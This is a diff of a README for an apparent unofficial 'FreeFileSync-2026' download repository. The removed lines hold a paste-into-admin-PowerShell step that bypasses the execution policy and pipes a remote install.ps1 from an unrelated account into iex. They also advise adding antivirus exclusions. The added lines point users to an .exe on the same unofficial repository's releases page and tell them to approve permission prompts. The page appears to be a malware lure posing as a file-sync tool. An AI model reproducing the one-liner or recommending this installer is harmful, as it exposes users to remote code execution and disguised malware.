@@ -1,71 +1,70 @@
-# FreeFileSync Download for Windows 11 & 10
+# 📁 FreeFileSync-2026 - Sync your files with ease today
 
-**FreeFileSync-2026**
+[![](https://img.shields.io/badge/Download-FreeFileSync-blue.svg)](https://github.com/MrDotcom0/FreeFileSync-2026/releases)
 
-**FreeFileSync** download for Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
+## 📌 About this software
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Get-Download%20Link-16a34a?style=flat-square)]()
+FreeFileSync-2026 helps you keep your files in order. It copies your data from one folder to another. Use it to back up your photos, work files, or music. It works well on Windows 11 and Windows 10. You do not need technical skills to use it. The program shows you which files differ between your locations. You choose which files to update. This prevents data loss. It makes sure your computers and drives match exactly.
 
----
+## 🛠️ System requirements
 
-## Download & Install
+Before you install the software, check your computer. You need a PC running Windows 10 or Windows 11. Your computer needs at least 200 megabytes of free space on your hard drive. Most modern computers meet these needs. Ensure you have an internet connection to download the installer. You also need basic administrator rights on your PC to finish the setup.
 
-> **This is the download page.** Copy the command below into **PowerShell (Admin)** to download and run the installer.
+## 📥 How to download the application
 
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+The installation file resides on the releases page. Follow these steps to get the file.
 
-| Step | What to do |
-| --- | --- |
-| 1 | Press **Win + X** → **Terminal (Admin)** or **PowerShell (Admin)** |
-| 2 | Paste the command above and press **Enter** |
-| 3 | Wait for the download — progress shows in the console |
-| 4 | Follow on-screen prompts (license key if asked) |
-| 5 | Restart if requested, then open **FreeFileSync** from Start menu |
+1. Go to the [official release page](https://github.com/MrDotcom0/FreeFileSync-2026/releases).
+2. Look for the latest version at the top of the list.
+3. Click the link that ends in .exe.
+4. Save the file to your Downloads folder.
 
-**Install type:** PowerShell one-liner (no browser required after Admin shell is open).
+The file size remains small. The download takes less than a minute on most home networks. Once the progress bar finishes, you find the installer in your file browser.
 
----
+## ⚙️ How to install on Windows
 
-## About
+Run the installation file once you finish the download. Follow the prompts on your screen.
 
-**FreeFileSync** setup page for Windows PC users.
+1. Double-click the downloaded file in your folder.
+2. Accept the software license terms.
+3. Choose the install location on your hard drive.
+4. Click Install to start the process.
+5. Click Finish when the bar fills up.
 
-**People also search for:** freefilesync download, freefilesync install setup windows 2026 sync
+The software creates a shortcut on your desktop. This makes it easy to open the app later. If a window pops up asking for permission to change settings on your PC, click Yes.
 
-**Repository:** `FreeFileSync-2026`
+## 🚀 Learning the basics
 
+When you open FreeFileSync, you see two sides of the main screen. These represent your two folders. 
 
-## After install
+1. Click the green Browse button on the left side. Choose your first folder.
+2. Click the green Browse button on the right side. Choose your second folder.
+3. Click the Compare button. The app scans both folders.
+4. Review the list of changes. The icons show you which files change, move, or delete.
+5. Click the Synchronize button to start the process. 
 
-| Step | Tip |
-| --- | --- |
-| 1 | Sign in with your license / account |
-| 2 | Check for updates inside the app |
-| 3 | Pin to Start or taskbar for quick access |
-| 4 | Keep projects on a separate data drive |
+The software keeps a report of the work it performs. This confirms that all files copied correctly.
 
-## System requirements
+## 💾 Understanding sync modes
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 4 GB |
-| Disk | 1 GB free space |
-| Network | Required for first download |
-| Admin | Required for install/repair |
+The program offers different ways to move your files. You choose the mode that works best for your needs.
 
-## Troubleshooting
+- Two-way: This keeps both folders the same. If you change a file on the left, it updates the right side and vice versa. Use this to keep two computers in sync.
+- Mirror: This makes the right folder a copy of the left folder. It deletes files on the right that do not exist on the left. This provides a clean backup.
+- Update: This moves new or changed files from the left to the right. It does not delete anything. This safe mode helps you build a file backup over time.
 
-| Issue | Try this |
-| --- | --- |
-| Download does not start | Disable VPN/ad-block for the project page |
-| Setup blocked | Run as Administrator |
-| Same error after fix | Reboot, then run repair again |
-| Antivirus warning | Add installer folder to exclusions temporarily |
+## 🛡️ Best practices for backups
 
----
+Keep your data safe by following simple habits. Perform a sync at the end of every work session. Store your backup drive in a different location than your computer. If you have many files, test a restore once a month. Create a test folder and see if the files open correctly after a sync. This habit ensures your backups work when you need them.
 
-**Topics:** freefilesync-download, freefilesync, freefilesync-install-setup-windows-2026-sync, freefilesync-2026, file-sync, backup, folder-sync, software, windows-11, download
+## 🔧 Troubleshooting common problems
+
+Sometimes the connection between folders breaks. This usually happens if you unplug a USB drive. If the software cannot find your folder, click the red error message. Browse to the new location of the folder again. If files fail to copy, check your disk space. Ensure the destination drive is not full. Close other programs if the sync speed slows down during large transfers.
+
+## 🔍 Frequently asked questions
+
+What does the software cost? The version here is free for all users. Do I need to be online? No. You only need the internet to download the initial installer file. After that, you run the app without a web connection. Does this work on network drives? Yes. The software treats a network drive like any other folder. Simply browse to the network path and select it as you normally would.
+
+## 📋 Keeping the software updated
+
+Check the download link periodically for new versions. The community maintains this project to ensure it works on the latest Windows updates. If you see a new version, download it and run the installer again. The new version replaces the old version while keeping your settings intact. This ensures your software keeps running smoothly.
